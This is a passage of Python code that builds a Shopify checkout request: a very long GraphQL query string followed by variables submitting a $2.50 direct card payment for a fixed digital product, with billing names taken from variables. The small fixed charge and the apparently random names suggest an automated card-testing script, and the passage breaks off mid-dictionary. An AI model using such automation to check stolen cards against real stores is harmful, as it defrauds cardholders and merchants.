ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}}fragment ProposalDetails on Proposal{merchandiseDiscount{...ProposalDiscountFragment __typename}cartMetafields{...on CartMetafieldUpdateOperation{key namespace value type appId namespaceAppId valueType __typename}__typename}deliveryDiscount{...ProposalDiscountFragment __typename}deliveryExpectations{...ProposalDeliveryExpectationFragment __typename}memberships{...ProposalMembershipsFragment __typename}availableRedeemables{...on PendingTerms{taskId pollDelay __typename}...on AvailableRedeemables{availableRedeemables{paymentMethod{...RedeemablePaymentMethodFragment __typename}balance{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}shopCashBalance{...on UnavailableTerms{__typename _singleInstance}...on FilledShopCashBalance{availableBalance{amount currencyCode __typename}__typename}...on PendingTerms{taskId pollDelay __typename}__typename}availableDeliveryAddresses{name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone handle label __typename}mustSelectProvidedAddress canUpdateDiscountCodes delivery{...on FilledDeliveryTerms{intermediateRates progressiveRatesEstimatedTimeUntilCompletion shippingRatesStatusToken splitShippingToggle crossBorder deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPredictionEligible deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}deliveryMacros{totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles id title totalTitle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}payment{...on FilledPaymentTerms{availablePaymentLines{placements paymentMethod{...on PaymentProvider{paymentMethodIdentifier name brands paymentBrands orderingIndex displayName extensibilityDisplayName availablePresentmentCurrencies paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}checkoutHostedFields alternative supportsNetworkSelection supportsVaulting __typename}...on OffsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex showRedirectionNotice availablePresentmentCurrencies popupEnabled}...on CustomOnsiteProvider{__typename paymentMethodIdentifier name paymentBrands orderingIndex availablePresentmentCurrencies popupEnabled paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}displayIncentive}...on AnyRedeemablePaymentMethod{__typename availableRedemptionConfigs{__typename...on CustomRedemptionConfig{paymentMethodIdentifier paymentMethodUiExtension{...UiExtensionInstallationFragment __typename}__typename}}orderingIndex}...on WalletsPlatformConfiguration{name paymentMethodIdentifier configurationParams __typename}...on BankPaymentMethod{displayName orderingIndex paymentMethodIdentifier paymentProviderClientCredentials{apiClientKey merchantAccountId __typename}availableInstruments{bankName lastDigits shopifyPublicToken __typename}__typename}...on PaypalWalletConfig{__typename name clientId merchantId venmoEnabled payflow paymentIntent paymentMethodIdentifier orderingIndex clientToken supportsVaulting sandboxTestMode}...on ShopPayWalletConfig{__typename name storefrontUrl paymentMethodIdentifier orderingIndex}...on ShopifyInstallmentsWalletConfig{__typename name availableLoanTypes maxPrice{amount currencyCode __typename}minPrice{amount currencyCode __typename}supportedCountries supportedCurrencies giftCardsNotAllowed subscriptionItemsNotAllowed ineligibleTestModeCheckout ineligibleLineItem paymentMethodIdentifier orderingIndex}...on ApplePayWalletConfig{__typename name supportedNetworks walletAuthenticationToken walletOrderTypeIdentifier walletServiceUrl paymentMethodIdentifier orderingIndex}...on GooglePayWalletConfig{__typename name allowedAuthMethods allowedCardNetworks gateway gatewayMerchantId merchantId authJwt environment paymentMethodIdentifier orderingIndex}...on LocalPaymentMethodConfig{__typename paymentMethodIdentifier name displayName orderingIndex}...on AnyPaymentOnDeliveryMethod{__typename additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex name availablePresentmentCurrencies}...on ManualPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on CustomPaymentMethodConfig{id name additionalDetails paymentInstructions paymentMethodIdentifier orderingIndex availablePresentmentCurrencies __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{__typename expired expiryMonth expiryYear name orderingIndex...CustomerCreditCardPaymentMethodFragment}...on PaypalBillingAgreementPaymentMethod{__typename orderingIndex paypalAccountEmail...PaypalBillingAgreementPaymentMethodFragment}__typename}__typename}paymentLines{...PaymentLines __typename}billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}paymentFlexibilityPaymentTermsTemplate{id translatedName dueDate dueInDays type __typename}depositConfiguration{...on DepositPercentage{percentage __typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}poNumber merchandise{...on FilledMerchandiseTerms{taxesIncluded bwpItems merchandiseLines{stableId finalSale merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}parentRelationship{parent{...ParentMerchandiseLine __typename}__typename}legacyFee __typename}__typename}__typename}note{customAttributes{key value __typename}message __typename}scriptFingerprint{signature signatureUuid lineItemScriptChanges paymentScriptChanges shippingScriptChanges __typename}transformerFingerprintV2 buyerIdentity{...on FilledBuyerIdentityTerms{shopUser{publicId metafields{key namespace value type valueType __typename}__typename}customer{...on GuestProfile{presentmentCurrency countryCode market{id handle __typename}shippingAddresses{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}...on CustomerProfile{id presentmentCurrency fullName firstName lastName countryCode market{id handle __typename}email imageUrl acceptsSmsMarketing acceptsEmailMarketing ordersCount phone billingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}__typename}shippingAddresses{id default address{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label coordinates{latitude longitude __typename}__typename}__typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}...on BusinessCustomerProfile{checkoutExperienceConfiguration{editableShippingAddress __typename}id presentmentCurrency fullName firstName lastName acceptsSmsMarketing acceptsEmailMarketing countryCode imageUrl market{id handle __typename}email ordersCount phone __typename}__typename}purchasingCompany{company{id externalId name __typename}contact{locationCount __typename}location{id externalId name billingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}shippingAddress{firstName lastName address1 address2 phone postalCode city company zoneCode countryCode label __typename}storeCreditAccounts{id balance{amount currencyCode __typename}__typename}__typename}__typename}phone email marketingConsent{...on SMSMarketingConsent{value __typename}...on EmailMarketingConsent{value __typename}__typename}shopPayOptInPhone rememberMe __typename}__typename}checkoutCompletionTarget recurringTotals{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacySubtotalBeforeTaxesShippingAndFees{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}legacyAggregatedMerchandiseTermsAsFees{title description total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}legacyRepresentProductsAsFees totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deferredTotal{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt __typename}hasOnlyDeferredShipping subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalAfterMerchandiseDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}duty{...on FilledDutyTerms{totalDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAdditionalFeesAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}tip{tipSuggestions{...on TipSuggestion{__typename percentage amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}}__typename}terms{...on FilledTipTerms{tipLines{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}__typename}__typename}__typename}localizationExtension{...on LocalizationExtension{fields{...on LocalizationExtensionField{key title value __typename}__typename}__typename}__typename}landedCostDetails{incotermInformation{incoterm reason __typename}__typename}dutiesIncluded nonNegotiableTerms{signature contents{signature targetTerms targetLine{allLines index __typename}attributes __typename}__typename}optionalDuties{buyerRefusesDuties refuseDutiesPermitted __typename}attribution{attributions{...on RetailAttributions{deviceId locationId userId __typename}...on DraftOrderAttributions{userIdentifier:userId sourceName locationIdentifier:locationId __typename}__typename}__typename}saleAttributions{attributions{...on SaleAttribution{recipient{...on StaffMember{id __typename}...on Location{id __typename}...on PointOfSaleDevice{id __typename}__typename}targetMerchandiseLines{...FilledMerchandiseLineTargetCollectionFragment...on AnyMerchandiseLineTargetCollection{any __typename}__typename}__typename}__typename}__typename}managedByMarketsPro captcha{...on Captcha{provider challenge sitekey token __typename}...on PendingTerms{taskId pollDelay __typename}__typename}cartCheckoutValidation{...on PendingTerms{taskId pollDelay __typename}__typename}alternativePaymentCurrency{...on AllocatedAlternativePaymentCurrencyTotal{total{amount currencyCode __typename}paymentLineAllocations{amount{amount currencyCode __typename}stableId __typename}__typename}__typename}isShippingRequired remote{...RemoteDetails __typename}__typename}fragment ProposalDeliveryExpectationFragment on DeliveryExpectationTerms{__typename...on FilledDeliveryExpectationTerms{deliveryExpectations{minDeliveryDateTime maxDeliveryDateTime deliveryStrategyHandle brandedPromise{logoUrl darkThemeLogoUrl lightThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name handle __typename}deliveryOptionHandle deliveryExpectationPresentmentTitle{short long __typename}promiseProviderApiClientId signedHandle returnability __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}}fragment ProposalMembershipsFragment on MembershipTerms{__typename...on FilledMembershipTerms{memberships{apply handle __typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{_singleInstance __typename}}fragment RedeemablePaymentMethodFragment on RedeemablePaymentMethod{redemptionSource redemptionContent{...on ShopCashRedemptionContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}__typename}redemptionPaymentOptionKind redemptionId destinationAmount{amount currencyCode __typename}sourceAmount{amount currencyCode __typename}details{redemptionId sourceAmount{amount currencyCode __typename}destinationAmount{amount currencyCode __typename}redemptionType __typename}__typename}...on StoreCreditRedemptionContent{storeCreditAccountId __typename}...on CustomRedemptionContent{redemptionAttributes{key value __typename}maskedIdentifier paymentMethodIdentifier __typename}__typename}__typename}fragment UiExtensionInstallationFragment on UiExtensionInstallation{extension{approvalScopes{handle __typename}capabilities{apiAccess networkAccess blockProgress collectBuyerConsent{smsMarketing customerPrivacy __typename}__typename}metafieldRequests{namespace key __typename}apiVersion appId appUrl preloads{target namespace value __typename}appName extensionLocale extensionPoints name registrationUuid scriptUrl translations uuid version __typename}__typename}fragment CustomerCreditCardPaymentMethodFragment on CustomerCreditCardPaymentMethod{id cvvSessionId paymentInstrumentAccessorId paymentMethodIdentifier token displayLastDigits brand defaultPaymentMethod deletable requiresCvvConfirmation firstDigits billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaypalBillingAgreementPaymentMethodFragment on PaypalBillingAgreementPaymentMethod{paymentMethodIdentifier token billingAddress{...on StreetAddress{address1 address2 city company countryCode firstName lastName phone postalCode zoneCode __typename}__typename}__typename}fragment PaymentLines on PaymentLine{stableId specialInstructions amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}dueAt due{...on PaymentLineDueEvent{event __typename}...on PaymentLineDueTime{time __typename}__typename}paymentMethod{...on DirectPaymentMethod{sessionId paymentMethodIdentifier creditCard{...on CreditCard{brand lastDigits name __typename}__typename}paymentAttributes __typename}...on GiftCardPaymentMethod{code balance{amount currencyCode __typename}__typename}...on RedeemablePaymentMethod{...RedeemablePaymentMethodFragment __typename}...on WalletsPlatformPaymentMethod{name walletParams __typename}...on WalletPaymentMethod{name walletContent{...on ShopPayWalletContent{billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}sessionToken paymentMethodIdentifier __typename}...on PaypalWalletContent{paypalBillingAddress:billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}email payerId token paymentMethodIdentifier acceptedSubscriptionTerms expiresAt merchantId payerApprovedAmount{amount currencyCode __typename}__typename}...on ApplePayWalletContent{data signature version lastDigits paymentMethodIdentifier header{applicationData ephemeralPublicKey publicKeyHash transactionId __typename}__typename}...on GooglePayWalletContent{signature signedMessage protocolVersion paymentMethodIdentifier __typename}...on ShopifyInstallmentsWalletContent{autoPayEnabled billingAddress{...on StreetAddress{firstName lastName company address1 address2 city countryCode zoneCode postalCode phone __typename}...on InvalidBillingAddress{__typename}__typename}disclosureDetails{evidence id type __typename}installmentsToken sessionToken paymentMethodIdentifier __typename}__typename}__typename}...on LocalPaymentMethod{paymentMethodIdentifier name __typename}...on PaymentOnDeliveryMethod{additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on OffsitePaymentMethod{paymentMethodIdentifier name __typename}...on CustomPaymentMethod{id name additionalDetails paymentInstructions paymentMethodIdentifier __typename}...on CustomOnsitePaymentMethod{paymentMethodIdentifier name paymentAttributes __typename}...on ManualPaymentMethod{id name paymentMethodIdentifier __typename}...on DeferredPaymentMethod{orderingIndex displayName __typename}...on CustomerCreditCardPaymentMethod{...CustomerCreditCardPaymentMethodFragment __typename}...on PaypalBillingAgreementPaymentMethod{...PaypalBillingAgreementPaymentMethodFragment __typename}...on NoopPaymentMethod{__typename}__typename}__typename}fragment RemoteDetails on Remote{consolidated{taxes{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}taxesIncludedAmountInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}termsStatus __typename}totals{subtotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}subtotalBeforeReductions{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalSavings{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}total{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalTaxes{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotalBeforeTaxesAndShipping{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}checkoutTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}delivery{deliveryMacros{id title amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}deliveryPromisePresentmentTitle{short long __typename}deliveryStrategyHandles totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTitle __typename}isShippingRequired termsStatus __typename}__typename}remoteNegotiations{shopId sessionToken errors{...ViolationDetails __typename}result{...on RemoteNegotiationResultAvailable{sellerProposal{...RemoteSellerProposalFragment __typename}buyerProposal{...RemoteBuyerProposalFragment __typename}__typename}...on RemoteNegotiationResultUnavailable{reason __typename}__typename}__typename}__typename}fragment ViolationDetails on NegotiationError{code localizedMessage nonLocalizedMessage localizedMessageHtml...on RemoveTermViolation{target __typename}...on AcceptNewTermViolation{target __typename}...on ConfirmChangeViolation{from to __typename}...on UnprocessableTermViolation{target __typename}...on UnresolvableTermViolation{target __typename}...on ApplyChangeViolation{target from{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}to{...on ApplyChangeValueInt{value __typename}...on ApplyChangeValueRemoval{value __typename}...on ApplyChangeValueString{value __typename}__typename}__typename}...on RedirectRequiredViolation{target details __typename}...on GenericError{__typename}...on PendingTermViolation{__typename}__typename}fragment RemoteSellerProposalFragment on RemoteProposal{merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId finalSale merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}parentRelationship{parent{...ParentMerchandiseLine __typename}__typename}legacyFee __typename}__typename}__typename}delivery{...on FilledDeliveryTerms{deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPredictionEligible deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}tax{...on FilledTaxTerms{totalTaxAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalTaxAndDutyAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}totalAmountIncludedInTarget{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}exemptions{taxExemptionReason targets{...on TargetAllLines{__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay __typename}...on UnavailableTerms{__typename}__typename}runningTotal{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}__typename}fragment RemoteBuyerProposalFragment on RemoteProposal{merchandise{...on FilledMerchandiseTerms{taxesIncluded merchandiseLines{stableId finalSale merchandise{...SourceProvidedMerchandise...ProductVariantMerchandiseDetails...ContextualizedProductVariantMerchandiseDetails...on MissingProductVariantMerchandise{id digest variantId __typename}__typename}quantity{...on ProposalMerchandiseQuantityByItem{items{...on IntValueConstraint{value __typename}__typename}__typename}__typename}totalAmount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}recurringTotal{title interval intervalCount recurringPrice{amount currencyCode __typename}fixedPrice{amount currencyCode __typename}fixedPriceCount __typename}lineAllocations{...LineAllocationDetails __typename}lineComponentsSource lineComponents{...MerchandiseBundleLineComponent __typename}parentRelationship{parent{...ParentMerchandiseLine __typename}__typename}legacyFee __typename}__typename}__typename}delivery{...on FilledDeliveryTerms{deliveryLines{id availableOn destinationAddress{...on StreetAddress{handle name firstName lastName company address1 address2 city countryCode zoneCode postalCode oneTimeUse coordinates{latitude longitude __typename}phone __typename}...on Geolocation{country{code __typename}zone{code __typename}coordinates{latitude longitude __typename}postalCode __typename}...on PartialStreetAddress{name firstName lastName company address1 address2 city countryCode zoneCode postalCode phone oneTimeUse coordinates{latitude longitude __typename}__typename}__typename}targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}groupType selectedDeliveryStrategy{...on CompleteDeliveryStrategy{handle __typename}__typename}deliveryMethodTypes availableDeliveryStrategies{...on CompleteDeliveryStrategy{originLocation{id __typename}title handle custom description code acceptsInstructions phoneRequired methodType carrierName incoterms metafields{key namespace value __typename}brandedPromise{handle logoUrl lightThemeLogoUrl darkThemeLogoUrl darkThemeCompactLogoUrl lightThemeCompactLogoUrl name __typename}deliveryStrategyBreakdown{amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}discountRecurringCycleLimit excludeFromDeliveryOptionPrice flatRateGroupId targetMerchandise{...FilledMerchandiseLineTargetCollectionFragment __typename}__typename}minDeliveryDateTime maxDeliveryDateTime deliveryPredictionEligible deliveryPromiseProviderApiClientId deliveryPromisePresentmentTitle{short long __typename}displayCheckoutRedesign estimatedTimeInTransit{...on IntIntervalConstraint{lowerBound upperBound __typename}...on IntValueConstraint{value __typename}__typename}amount{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}amountAfterDiscounts{...on MoneyValueConstraint{value{amount currencyCode __typename}__typename}__typename}pickupLocation{...on PickupInStoreLocation{address{address1 address2 city countryCode phone postalCode zoneCode __typename}instructions name distanceFromBuyer{unit value __typename}__typename}...on PickupPointLocation{address{address1 address2 address3 city countryCode zoneCode postalCode coordinates{latitude longitude __typename}__typename}businessHours{day openingTime closingTime __typename}carrierCode carrierName handle kind name carrierLogoUrl fromDeliveryOptionGenerator __typename}__typename}__typename}__typename}__typename}__typename}...on PendingTerms{pollDelay taskId __typename}...on UnavailableTerms{__typename}__typename}__typename}',
        'variables': {
            'input': {
                'sessionInput': {
                    'sessionToken': x,
                },
                'queueToken': queue_token,
                'discounts': {
                    'lines': [],
                    'acceptUnexpectedDiscounts': True,
                },
                'delivery': {
                    'deliveryLines': [
                        {
                            'selectedDeliveryStrategy': {
                                'deliveryStrategyMatchingConditions': {
                                    'estimatedTimeInTransit': {
                                        'any': True,
                                    },
                                    'shipments': {
                                        'any': True,
                                    },
                                },
                                'options': {},
                            },
                            'targetMerchandiseLines': {
                                'lines': [
                                    {
                                        'stableId': stableid,
                                    },
                                ],
                            },
                            'deliveryMethodTypes': [
                                'NONE',  # For digital product, no shipping
                            ],
                            'expectedTotalPrice': {
                                'any': True,
                            },
                            'destinationChanged': True,
                        },
                    ],
                    'noDeliveryRequired': [],
                    'useProgressiveRates': False,
                    'prefetchShippingRatesStrategy': None,
                    'supportsSplitShipping': True,
                },
                'deliveryExpectations': {
                    'deliveryExpectationLines': [],
                },
                'merchandise': {
                    'merchandiseLines': [
                        {
                            'stableId': stableid,
                            'merchandise': {
                                'productVariantReference': {
                                    'id': 'gid://shopify/ProductVariantMerchandise/41957285840',
                                    'variantId': 'gid://shopify/ProductVariant/41957285840',
                                    'properties': [],
                                    'sellingPlanId': None,
                                    'sellingPlanDigest': None,
                                },
                            },
                            'quantity': {
                                'items': {
                                    'value': 1,
                                },
                            },
                            'expectedTotalPrice': {
                                'value': {
                                    'amount': '2.50',
                                    'currencyCode': 'USD',
                                },
                            },
                            'lineComponentsSource': None,
                            'lineComponents': [],
                        },
                    ],
                },
                'memberships': {
                    'memberships': [],
                },
                'payment': {
                    'totalAmount': {
                        'any': True,
                    },
                    'paymentLines': [
                        {
                            'paymentMethod': {
                                'directPaymentMethod': {
                                    'paymentMethodIdentifier': paymentmethodidentifier,
                                    'sessionId': sid,
                                    'billingAddress': {
                                        'streetAddress': {
                                            'address1': addr1,
                                            'address2': addr2,
                                            'city': city,
                                            'countryCode': country_code,
                                            'postalCode': postal,
                                            'lastName': addr_last,
                                            'firstName': rfirst,
                                            'zoneCode': zone,
                                            'phone': '',
                                        },
                                    },
                                    'cardSource': None,
                                },
                                'giftCardPaymentMethod': None,
                                'redeemablePaymentMethod': None,
                                'walletPaymentMethod': None,
                                'walletsPlatformPaymentMethod': None,
                                'localPaymentMethod': None,
                                'paymentOnDeliveryMethod': None,
                                'paymentOnDeliveryMethod2': None,
                                'manualPaymentMethod': None,
                                'customPaymentMethod': None,
                                'offsitePaymentMethod': None,
                                'customOnsitePaymentMethod': None,
                                'deferredPaymentMethod': None,
                                'customerCreditCardPaymentMethod': None,
                                'paypalBillingAgreementPaymentMethod': None,
                                'remotePaymentInstrument': None,
                            },
                            'amount': {
                                'value': {
                                    'amount': '2.50',
                                    'currencyCode': 'USD',
                                },
                            },
                        },
                    ],
                    'billingAddress': {
                        'streetAddress': {
                            'address1': addr1,
                            'address2': addr2,
                            'city': city,
                            'countryCode': country_code,
                            'postalCode': postal,
                            'lastName': rlast,
                            'firstName': rfirst,
                            'zoneCode': zone,
                            'phone': '',
                        },
                    },
                },
                'buyerIdentity': {
                    'customer': {
                        'presentmentCurrency': 'USD',
